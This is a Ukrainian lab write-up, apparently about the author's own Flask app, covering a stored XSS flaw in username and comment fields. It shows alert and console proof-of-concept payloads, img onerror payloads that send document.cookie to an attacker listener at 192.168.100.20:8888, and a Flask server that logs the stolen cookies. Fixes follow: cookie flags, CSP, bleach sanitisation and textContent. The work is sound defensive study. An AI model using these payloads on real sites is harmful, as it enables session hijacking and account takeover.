@@ -1,0 +1,254 @@
+
+                <!DOCTYPE html>
+                <html lang="uk">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Document</title>
+                        <link rel="stylesheet" href=..\..\style.css>
+                    </head>
+                    <body>
+                        <h1 class="topic-name">Stored XSS</h2>
+                        <div class="main">
+                            <ul>
+<li><a href="../../index.html">HOME</a></li>
+<li><strong>Вразливості веб застосунку</strong>
+<ul>
+<li><strong>API Endpoints</strong>
+<ul>
+<li><a href="../API Endpoints/API.html">API</a></li>
+</ul>
+</li>
+<li><strong>CSRF</strong>
+<ul>
+<li><a href="../CSRF/CSRF.html">CSRF</a></li>
+</ul>
+</li>
+<li><strong>File Upload</strong>
+<ul>
+<li><a href="../File Upload/Завантаження аватарки.html">Завантаження аватарки</a></li>
+</ul>
+</li>
+<li><strong>Login форма</strong>
+<ul>
+<li><a href="../Login форма/User enumeration.html">User enumeration</a></li>
+<li><a href="../Login форма/Словниковий перебір та брут-форсинг паролів.html">Словниковий перебір та брут-форсинг паролів</a></li>
+</ul>
+</li>
+<li><strong>Overexposed JSON</strong>
+<ul>
+<li><a href="../Overexposed JSON/Надмірне розкриття даних.html">Надмірне розкриття даних</a></li>
+</ul>
+</li>
+<li><strong>XSS</strong>
+<ul>
+<li><a href="Stored XSS.html">Stored XSS</a></li>
+</ul>
+</li>
+<li><strong>Конфігурація</strong>
+<ul>
+<li><a href="../Конфігурація/Fail2Ban.html">Fail2Ban</a></li>
+<li><a href="../Конфігурація/Firewall.html">Firewall</a></li>
+<li><a href="../Конфігурація/HTTPS.html">HTTPS</a></li>
+<li><a href="../Конфігурація/Internal Network.html">Internal Network</a></li>
+<li><a href="../Конфігурація/PostgreSQL.html">PostgreSQL</a></li>
+<li><a href="../Конфігурація/SSH.html">SSH</a></li>
+</ul>
+</li>
+<li><a href="../Налаштування користувача.html">Налаштування користувача</a></li>
+<li><a href="../Структура та ідеї.html">Структура та ідеї</a></li>
+</ul>
+</li>
+</ul>
+
+                            <div class="content">
+                            <hr />
+<h2>Наявність вразливості</h2>
+<p>Stored Cross Site Scripting у випадку з моїм застосунком присутній в налаштуваннях профілю користувача.</p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210100402.png" alt="Pasted image 20260210100402.png" /></div>
+
+<hr />
+<p>У користувача є можливість змінювати власне ім'я. Проблема в тому, що введені користувачем дані не перевіряються на XSS. Тобто в поле імені можна ввести наступний payload, до прикладу, який просто виводитиме повідомлення з текстом: </p>
+<pre><code class="language-html">&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;
+</code></pre>
+<p>Через відсутність фільтрації цей payload буде збережено в тому ж вигляді (18id - user):</p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210101044.png" alt="Pasted image 20260210101044.png" /></div>
+
+<hr />
+<p>Імена користувачів відображаються у вікні адміністратора. Коли <strong>admin</strong> зайде в таблицю користувачів, то клієнт має зробити запит на сервер та отримати їхні імена. Після чого JS скрипт опрацює отримані дані, та сформує таблицю:</p>
+<pre><code class="language-js">document.addEventListener('DOMContentLoaded', async () =&gt; {
+    await fetch('/api/get_all_users', {
+        method: &quot;GET&quot;
+    }).then(res =&gt; res.json())
+    .then(data =&gt; {
+        const container = document.querySelector('.users-list');
+        const template = document.querySelector('.users-list-template');
+        data.forEach(info =&gt; {
+            const clone = template.content.cloneNode(true);
+            clone.querySelector('.name').innerHTML = info.user;
+            clone.querySelector('.role').innerHTML = info.role;
+            container.appendChild(clone);
+        });
+    })
+})
+</code></pre>
+<div class="callout callout-warning">Наступна пов'язана проблема з цим - це використання `innerHTML` для того, аби вставити потрібні дані.</div>
+
+<hr />
+<p>В результаті в панелі адміна буде таке повідомлення, яке свідчить про XSS вразливість:</p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210100922.png" alt="Pasted image 20260210100922.png" /></div>
+
+<p>Таким же чином ми можемо отримати доступ до cookie:</p>
+<pre><code class="language-html">&lt;img src=x onerror=console.log(document.cookie)&gt;
+</code></pre>
+<div class="callout callout-info">В цьому випадку кукі виведуться в консоль браузера самого адміна</div>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210102342.png" alt="Pasted image 20260210102342.png" /></div>
+
+<hr />
+<p>Але все вище перераховане свідчить лише про наявність XSS вразливості і не несе великої шкоди. Та окрім цього поля введення присутні ще місця з такою ж вразливістю. </p>
+<hr />
+<h2>Використання вразливості</h2>
+<p>На сайті є функція коментарів, де кожен користувач може залишати свій коментар і в подальшому вони будуть відображатися на головній сторінці всіх авторизованих користувачів:</p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210141412.png" alt="Pasted image 20260210141412.png" /></div>
+<blockquote>
+<p>І виявляється, що тут є вразливість до XSS! Це ж треба..</p>
+</blockquote>
+<hr />
+<p>Для початку мені треба створити невеличкий http сервер на стороні <strong>атакуючого</strong>:</p>
+<pre><code class="language-python">from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def get_cookie():   
+    cookie = request.args.get('c')
+    print(cookie)
+    return &quot;&quot;, 200
+if __name__ == '__main__':
+    app.run(port=8888, host='0.0.0.0', debug=True)
+</code></pre>
+<blockquote>
+<p>Цей невеличкий застосунок буде отримувати запити в яких міститимуться cookie та виводитиме їх в термінал. Назвемо його <strong>слухач</strong>.</p>
+</blockquote>
+<p>Далі треба створити payload, який буде робити цей запит до <strong>слухача</strong>:</p>
+<pre><code class="language-html">&lt;img src=1 onerror=document.location=&quot;http://192.168.100.20:8888/?c=&quot;+document.cookie;&gt;
+</code></pre>
+<blockquote>
+<p>Банальний тег, який буде намагатися отримати доступ до неіснуючого зображення, що в результаті приведе до помилки, і тоді наш запит відтвориться.</p>
+</blockquote>
+<hr />
+<p>Після цей payload треба написати в коментар. Його не буде видно в секції з коментарями, але він існує як частина коду HTML. Тепер кожного разу, коли будь хто буде робити запит на головну сторінку, де й знаходяться коментарі, payload буде пересилати їх:</p>
+<pre><code>http://192.168.100.20:8888/?c=session=...
+</code></pre>
+<p>Я авторизувався від імені <strong>moderator</strong> користувача та <strong>admin</strong>. Коли вони отримують доступ до цієї вже небезпечної сторінки, в терміналі атакуючого відображатимуться їхні cookie(ну й також там ще <strong>user</strong> cookie, оскільки payload я завантажував від його імені і на ньому він теж спрацював):</p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210142843.png" alt="Pasted image 20260210142843.png" /></div>
+
+<hr />
+<p>Або можна зробити запит також через <strong>fetch</strong>:</p>
+<pre><code class="language-html">&lt;img src=1 onerror=&quot;fetch('http://192.168.100.20:8888',{method:'POST',mode:'no-cors',body:document.cookie})&quot;&gt;
+</code></pre>
+<p>Тільки обробляти отримані дані вже треба по іншому:</p>
+<pre><code class="language-python">from flask import Flask, request, redirect
+
+app = Flask(__name__)
+
+@app.route('/', methods=[&quot;POST&quot;, &quot;GET&quot;])
+def hello_world():
+    data = request.data
+    print(&quot;DATA: &quot;,data)
+
+    ...
+</code></pre>
+<hr />
+<p>XSS payload'ів доволі багато, наведені приклади всього деякі з них.</p>
+<hr />
+<h2>Заходи безпеки</h2>
+<h3>Cookie</h3>
+<p>Щоб уникнути крадіжки cookie варто в конфігурації встановити наступні правила:</p>
+<pre><code class="language-python">SESSION_COOKIE_HTTPONLY=True,
+SESSION_COOKIE_SECURE=True,
+SESSION_COOKIE_SAMESITE=&quot;Lax&quot;,
+</code></pre>
+<ul>
+<li>Завдяки <code>HttpOnly</code> не можна буде отримати доступ до кукі таким шляхом, як <code>document.cookie</code></li>
+<li><code>Secure</code> - передача cookie тільки через HTTPS</li>
+<li><code>SameSite</code> - заблокує такий різновид крадіжки. Тут можна було б навіть встановити <code>Strict</code>, але варто знати що він може поламати OAuth.<ul>
+<li><code>Strict</code> — cookie не передається при переході з іншого сайту</li>
+<li><code>Lax</code> — дозволяє GET переходи</li>
+<li><code>None</code> — небезпечно (потрібен HTTPS)</li>
+</ul>
+</li>
+</ul>
+<hr />
+<p>Варто встановити CSP (Content Security Policy)</p>
+<pre><code class="language-python">@app.after_request
+def set_csp(resp):
+    resp.headers['Content-Security-Policy'] = (
+        &quot;default-src 'self'; &quot;
+        &quot;script-src 'self'; &quot;
+        &quot;style-src 'self'; &quot;
+        &quot;img-src 'self' data:; &quot;
+        &quot;connect-src 'self'; &quot;
+        &quot;object-src 'none'; &quot;
+        &quot;base-uri 'none'; &quot;
+        &quot;frame-ancestors 'none'&quot;
+    )
+    return resp
+</code></pre>
+<ul>
+<li><code>default-src</code> - базове правило для всього</li>
+<li><code>script-src</code> - заборонить inlineJS, <code>onerror=...</code>, <code>onclick=...</code></li>
+<li><code>object-src</code> - Заборонить Flash/embeds</li>
+<li><code>base-uri</code> - заборонить атаки через <code>&lt;base href=...&gt;</code></li>
+<li><code>frame-ancestors</code> - заборонить clickjacking</li>
+<li><code>style-src</code> - заборонить XSS ін'єкцію через CSS (та зараз не актуально, застаріле)</li>
+<li><code>connect-src</code> - заборонить <code>fetch</code></li>
+</ul>
+<hr />
+<p>Якщо зайти на сторінку, на якій відтворюється payload, то CSP заблокує його і почне сваритися в консолі: </p>
+<div class="image-div"><img src="..\..\..\Converter\HTMLPages\images\Pasted image 20260210151830.png" alt="Pasted image 20260210151830.png" /></div>
+
+<hr />
+<h3>HTML дезінфекція</h3>
+<p>CSP не даватиме вставляти код HTML. Тим не менш, на стороні сервера все одно має відбуватися фільтрація введених користувачем даних. На мові Python це можна зробити завдяки бібліотеці <code>bleach</code>, яка буде проводити "дезінфекцію" потенційного HTML коду.  </p>
+<pre><code class="language-python">@app.route('/api/add_comment', methods=[&quot;POST&quot;])
+@login_required
+def add_comment():
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({&quot;status&quot;: &quot;error&quot;, &quot;text&quot;: &quot;Missing data&quot;}), 400
+    comment_text = data[&quot;comment&quot;]  
+    sanitize_comment_text = bleach.clean(comment_text, strip=True)
+    if not sanitize_comment_text:
+        return jsonify({&quot;status&quot;: &quot;error&quot;, &quot;text&quot;: &quot;Missing data&quot;}), 400
+    comment = Comment(content=sanitize_comment_text, user_id=current_user.id)
+    db.session.add(comment)
+    db.session.commit()
+    return jsonify({&quot;status&quot;: &quot;success&quot;, &quot;data&quot;: {&quot;comment&quot;:sanitize_comment_text, &quot;user&quot;:current_user.username}}), 200
+</code></pre>
+<p>Наведена вище функція - це API додавання коментаря, яка проводить фільтрацію на HTML код, без виключень. </p>
+<p>Така очистка має замінювати теги HTML на символи, які вже не будуть нести шкоди. Але оскільки встановлена опція <code>strip=True</code> - всі теги будуть видалятися а не замінюватися. Тому якщо ми спробуємо завантажити раніше використаний payload для XSS, то в результаті фільтрації отримаємо порожній рядок, оскільки це один суцільний тег (<code>&lt;img ...&gt;</code>)</p>
+<pre><code class="language-python">sanitize_comment_text = bleach.clean(comment_text, strip=True)
+</code></pre>
+<p>Подібна дезінфекція проводитиметься з усіма введеними даними від користувача. </p>
+<p>Також на стороні клієнта була присутня вразливість Reflected XSS. Коли користувач вводив коментар, він відразу додавався на сторінку через JS. Але тепер сервер повертатиме вже оброблені введені дані і тільки вони будуть вже вставлятися на сторінку. </p>
+<p>Також всі не потрібні виклики <code>innerHTML</code> в JS коді були замінені на <code>textContent</code>:</p>
+<pre><code class="language-js">...
+clone.querySelector('.comment').textContent = response_data.data.comment;
+clone.querySelector('.name').textContent = response_data.data.user;
+...
+</code></pre>
+<hr />
+<p>Функція зміни імені теж була забезпечена кращою обробкою даних. Окрім фільтрації HTML тегів відбувається перевірка на наявність спеціальних символів (окрім <code>_</code> та <code>'</code>):</p>
+<pre><code class="language-python">def validate_username(username):
+    errors = []
+    if len(username) &gt; 15 or len(username) &lt; 3:
+        errors.append(&quot;the length of the username must be between 3 and 15 letters&quot;)
+    if re.search(r&quot;[!@#$%^&amp;*()+=\-{}[\]:;\&quot;&lt;&gt;,.?/]&quot;, username):
+        errors.append(&quot;the username cannot contain special characters&quot;)
+    return errors
+</code></pre>
+                            </div>
+                        </div>
+                    </body>
+                </html>
+                
